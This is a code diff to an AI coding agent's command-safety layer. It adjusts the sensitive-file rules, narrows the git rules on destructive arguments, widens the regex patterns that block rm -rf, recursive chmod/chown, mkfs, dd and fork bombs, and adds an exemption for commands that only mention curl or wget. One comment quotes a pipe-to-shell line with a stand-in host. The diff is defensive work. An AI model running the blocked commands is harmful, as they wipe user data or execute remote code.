@@ -959,6 +959,18 @@ SENSITIVE_FILE_PATTERNS = [
 SENSITIVE_FILE_EXTENSIONS = frozenset([".pem", ".key", ".rsa", ".p12"])
 SENSITIVE_FILE_GLOBS = ["*_KEY*", "*_SECRET*", "*_TOKEN*", "*_PASSWORD*",
                         "*_key*", "*_secret*", "*_token*", "*_password*"]
+# Committed templates that document the variables and hold no values. Reading
+# one is how a project gets set up; the real .env it is copied to stays blocked.
+ENV_TEMPLATE_NAMES = frozenset([".env.example", ".env.sample", ".env.template", ".env.dist"])
+# The name globs above target secret-holding files (API_KEY.txt, github_token).
+# Source files with those words in their name -- count_tokens.py,
+# reset_password.py -- are code, and refusing them stopped the agent from
+# reading or creating ordinary files. Config/data formats stay covered.
+SOURCE_CODE_EXTENSIONS = frozenset([
+    ".py", ".pyi", ".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx", ".go", ".rs",
+    ".java", ".kt", ".rb", ".php", ".c", ".h", ".cc", ".cpp", ".hpp", ".cs",
+    ".swift", ".scala", ".vue", ".svelte", ".html", ".css", ".md", ".rst",
+])
 
 # Shell startup files: writing one is arbitrary code execution on the user's
 # next shell launch, so writes are refused at the always-on floor — even in
@@ -1004,7 +1016,10 @@ def _is_sensitive_path(filepath: str) -> bool:
         if _resolve_allowed_path(allowed) == resolved:
             return False
 
-    # Exact filename match
+    # Exact filename match. An env template is judged by its directory alone,
+    # so ~/.ssh/.env.example is still refused.
+    if fn in ENV_TEMPLATE_NAMES:
+        fn, fp = "", str(Path(filepath).parent).lower()
     for pattern in SENSITIVE_FILE_PATTERNS:
         if pattern.lower() in fn or pattern.lower() in fp:
             return True
@@ -1016,6 +1031,8 @@ def _is_sensitive_path(filepath: str) -> bool:
 
     # Glob patterns
     import fnmatch
+    if Path(fn).suffix in SOURCE_CODE_EXTENSIONS:
+        return False
     for glob in SENSITIVE_FILE_GLOBS:
         if fnmatch.fnmatch(fn, glob):
             return True
@@ -1101,17 +1118,27 @@ def _dangerous_git_args(tokens: list) -> bool:
     if cursor >= len(tokens):
         return False
     action = tokens[cursor].lower()
-    flags = [token.lower() for token in tokens[cursor + 1:]]
+    raw = tokens[cursor + 1:]  # case matters below: -b/-B, -d/-D, -S/-s, -W
+    flags = [token.lower() for token in raw]
+    short = "".join(token[1:] for token in raw if token.startswith("-") and not token.startswith("--"))
+    forced = "f" in short or "--force" in flags
     return (
         action == "push"
         or (action == "reset" and "--hard" in flags)
-        or (action == "branch" and any(flag in ("-d", "-D", "--delete") for flag in flags))
+        # -d/--delete refuse a branch with unmerged work; only a forced delete loses it.
+        or (action == "branch" and ("d" in short.lower() or "--delete" in flags)
+            and ("D" in short or forced))
         or (action == "clean" and any("f" in flag.lstrip("-") for flag in flags if flag.startswith("-")))
-        or action in ("restore",)
+        # --staged alone only unstages; the working tree is untouched.
+        or (action == "restore" and not (
+            ("S" in short or "--staged" in flags)
+            and "W" not in short and "--worktree" not in flags))
+        # -b names a NEW branch, so the operands are names, not paths to overwrite.
+        # -B resets an existing branch and stays refused.
         or (action == "checkout" and (
             "--" in flags
-            or any(flag in ("-f", "--force") for flag in flags)
-            or any(not flag.startswith("-") for flag in flags)
+            or forced
+            or (any(not flag.startswith("-") for flag in flags) and "-b" not in raw)
         ))
         or (action == "switch" and any(
             flag in ("-f", "--force", "--discard-changes") for flag in flags))
@@ -1164,11 +1191,21 @@ def _outside_user_allowlist(command: str) -> bool:
 # Catastrophic commands that are blocked in ALL permission modes, including
 # edit mode. These cause irreversible damage: filesystem wipes, disk formats,
 # fork bombs, and remote-code-execution via pipe-to-shell at the root level.
+# A whole-system or whole-home target: / and ~ (also as $HOME / ${HOME}), each
+# optionally with a trailing / or /*, a top-level system directory, optionally
+# quoted. Must end the word, so ~/projects/old and /tmp/x stay ordinary.
+_WIPE_TARGET = (
+    r"""(["']?)(?:/\*?|(?:~|\$HOME|\$\{HOME\})(?:/\*?)?"""
+    r"|/(?:bin|boot|dev|etc|home|lib|lib64|opt|root|sbin|srv|usr|var"
+    r"|Users|System|Library|Applications)/?\*?)\1(?=\s|$)"
+)
 _UNRECOVERABLE_PATTERNS = [
-    # rm -rf / — wipe filesystem root (any flag order, --no-preserve-root, long/short)
-    re.compile(r"\brm\s+(?:[^|;&<>]*\s)?-(?:[^-]*r|--recursive)(?:[^|;&<>]*\s)?(?:[^|;&<>]*\s)?/(?:\s|$)"),
-    # rm -rf ~ — wipe home dir
-    re.compile(r"\brm\s+(?:[^|;&<>]*\s)?-(?:[^-]*r|--recursive)(?:[^|;&<>]*\s)?~(?:\s|$)"),
+    # rm -rf / ~ $HOME /* /usr ... — any flag order, --no-preserve-root, long/short
+    re.compile(r"\brm\s+(?:[^|;&<>]*\s)?-(?:[^-]*r|--recursive)(?:[^|;&<>]*\s)?(?:[^|;&<>]*\s)?"
+               + _WIPE_TARGET),
+    # chmod/chown/chgrp -R on the same targets: every file's mode or owner, unrecoverable
+    re.compile(r"\b(?:chmod|chown|chgrp)\s+(?:[^|;&<>]*\s)?-(?:[^-\s]*R|-recursive)"
+               r"(?:[^|;&<>]*\s)?" + _WIPE_TARGET),
     re.compile(r"\bmkfs(?:\.\w+)?\s+/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+)"),
     re.compile(r"\bdd\s+if=\S+\s+of=/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+)"),
     re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;"),
@@ -1257,7 +1294,82 @@ def _shell_web_urls(command: str):
     """
     if not _SHELL_WEB_CLIENT.search(command or ""):
         return None
-    return [match.group(0).rstrip(".,)]}") for match in _SHELL_HTTP_URL.finditer(command)]
+    urls = [match.group(0).rstrip(".,)]}") for match in _SHELL_HTTP_URL.finditer(command)]
+    if not urls and _web_client_only_mentioned(command):
+        return None
+    return urls
+
+
+def _shell_fetches_web(command: str) -> bool:
+    return _shell_web_urls(command) is not None
+
+
+# Commands that name a web client without running it: lookups, text search,
+# printing. Everything else that names one is treated as running it.
+_WEB_MENTION_LOOKUPS = frozenset([
+    "which", "where", "whereis", "type", "hash", "man", "help", "get-command", "gcm",
+    "grep", "egrep", "fgrep", "rg", "findstr", "echo", "printf", "dpkg", "apt-cache",
+])
+_WEB_CLIENT_INFO_FLAGS = frozenset(["--version", "-V", "--help", "-h"])
+_PACKAGE_MANAGERS = frozenset([
+    "apt", "apt-get", "dnf", "yum", "pacman", "zypper", "apk", "brew", "port", "pip",
+    "pip3", "pipx", "uv", "npm", "pnpm", "yarn", "winget", "choco", "scoop", "snap",
+    "conda", "gem", "cargo",
+])
+_GIT_TEXT_SUBCOMMANDS = frozenset(["commit", "log", "grep", "show", "diff", "status", "tag"])
+# Anything that can turn text into a command. Present anywhere, it voids the
+# exemption: `echo wget evil.com | sh` runs wget although only echo names it.
+_COMMAND_RUNNERS = frozenset([
+    "sh", "bash", "dash", "zsh", "ksh", "fish", "csh", "tcsh", "eval", "exec", "source",
+    "xargs", "env", "nohup", "time", "timeout", "nice", "watch", "parallel", "busybox",
+    "python", "python3", "py", "node", "deno", "bun", "perl", "ruby", "php", "pwsh",
+    "powershell", "cmd", "iex", "invoke-expression", "find",
+])
+
+
+def _web_client_only_mentioned(command: str) -> bool:
+    """True when every curl/wget/... in the command is named, never run.
+
+    `command -v wget`, `grep curl src/`, `apt-get install curl` and
+    `git commit -m 'drop curl'` were refused as URL-less fetches, so an agent
+    could not even check which tools exist. Conservative by construction: any
+    substitution, newline, runner, or unlexable input keeps the refusal.
+    """
+    if re.search(r"\$\(|`|[<>]\(|[\r\n]", command):
+        return False
+    parts = _lex_command(command)
+    if not parts:
+        return False
+    segments, current = [], []
+    for part in parts + [";"]:
+        if part in (";", "&&", "||", "&", "|"):
+            if current:
+                segments.append(current)
+            current = []
+        else:
+            current.append(part)
+    for segment in segments:
+        if segment[0] == "sudo" and len(segment) > 1 and not segment[1].startswith("-"):
+            segment = segment[1:]
+        exe = Path(segment[0]).stem.lower()
+        if segment[0] == "." or exe in _COMMAND_RUNNERS:
+            return False
+        if not _SHELL_WEB_CLIENT.search(" ".join(segment)):
+            continue
+        rest = segment[1:]
+        named_only = (
+            exe in _WEB_MENTION_LOOKUPS
+            or (exe == "command" and rest[:1] in (["-v"], ["-V"]))
+            or (exe in ("curl", "wget", "httpie", "http", "https", "lynx", "w3m")
+                and bool(rest) and all(arg in _WEB_CLIENT_INFO_FLAGS for arg in rest))
+            or (exe in _PACKAGE_MANAGERS
+                and any(arg.lower() in ("install", "add") for arg in rest[:3]))
+            or (exe == "pacman" and rest[:1] and rest[0].startswith("-S"))
+            or (exe == "git" and rest[:1] and rest[0] in _GIT_TEXT_SUBCOMMANDS)
+        )
+        if not named_only:
+            return False
+    return True
 
 
 # Beyond this length a command is not something a person is reasonably asking
@@ -12700,9 +12812,6 @@ def _user_requested_tool(messages, name: str) -> bool:
     return False
 
 
-# Web fetching wearing a shell command as a disguise.
-_WEB_FETCH_SHELL = _SHELL_WEB_CLIENT
-
 # MCP tools whose name says they fetch. Name-based because MCP specs carry no
 # capability metadata to key off — see the docstring in _is_fetch_followup.
 _MCP_FETCH_NAME = re.compile(r"(?:search|fetch|browse|web|http|scrape)", re.IGNORECASE)
@@ -12732,7 +12841,7 @@ def _is_fetch_followup(messages, name: str, args: dict) -> bool:
                     or _user_requested_tool(messages, name))
     if name == "execute_shell":
         command = str(args.get("command") or "")
-        return bool(_WEB_FETCH_SHELL.search(command)) and not _user_requested_tool(
+        return _shell_fetches_web(command) and not _user_requested_tool(
             messages, "execute_shell")
     if (TOOL_SPECS.get(name) or {}).get("mode") == "mcp":
         return bool(_MCP_FETCH_NAME.search(name)) and not _user_requested_tool(
